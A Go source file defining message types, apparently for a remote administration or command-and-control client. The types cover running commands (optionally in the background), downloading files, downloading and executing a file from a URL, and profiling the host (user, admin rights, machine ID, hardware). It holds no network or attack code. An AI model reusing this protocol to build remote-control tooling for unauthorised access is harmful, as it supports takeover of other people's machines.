package types

import (
	"encoding/gob"
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

// Registers all of the data types for gob
func Register() {
	gob.Register(BasicSystemInfo{})
	gob.Register(SystemInfo{})
	gob.Register(RunCommandRequest{})
	gob.Register(RunCommandReponse{})
	gob.Register(DownloadAndExecuteRequest{})
	gob.Register(DownloadAndExecuteResponse{})
	gob.Register(DownloadFileRequest{})
	gob.Register(DownloadFileResponse{})
}

type DownloadFileRequest struct {
	Url      string
	Location string
}
type DownloadFileResponse struct {
	Error string
}

type DownloadAndExecuteRequest struct {
	Url  string
	Args []string
}
type DownloadAndExecuteResponse struct {
	Error string // Nil if successful
}

type RunCommandRequest struct {
	Command   string
	Args      []string
	Backround bool // If this is true the command will be ran in the background
}
type RunCommandReponse struct {
	Success  bool
	Response string
}

// Basic system info
type BasicSystemInfo struct {
	OS            string
	InstallDate   time.Time
	Username      string
	Administrator bool
	Language      int
	MachineID     string
}

type SystemInfo struct {
	Username      string
	InstallDate   time.Time
	OS            string
	OSVersion     string
	Administrator bool
	ClientVersion int
	DeviceName    string
	Language      int

	MBRam                 int // MB of ram installed
	CoreCount             int
	LogicalProcessorCount int
	Architecture          string
	CPU                   string

	GPU string

	Device string // Info about device name and model

	MachineID string
}

func (info SystemInfo) String() string {
	// In Windows, The CPU info comes in json format so here we will attempt to decode it
	cpuInfo := info.CPU
	if strings.Contains(strings.ToLower(info.OS), "windows") {
		var data map[string]interface{}
		err := json.Unmarshal([]byte(cpuInfo), &data)
		if err == nil {
			if val, ok := data["modelName"]; ok {
				cpuInfo = fmt.Sprintf("%v", val)
			}
		}
	}

	return fmt.Sprintf(`Username: %s
Time since install: %s
OS: %s
OS Version: %s
Administrator: %t
Device Name: %s
Ram: %dMB
Cores: %d
Architecture: %s
CPU: %s
GPU: %s
Device Name: %s`,
		info.Username,
		time.Now().Sub(info.InstallDate).String(),
		info.OS,
		info.OSVersion,
		info.Administrator,
		info.DeviceName,
		info.MBRam,
		info.CoreCount,
		info.Architecture,
		cpuInfo,
		info.GPU,
		info.Device)
}
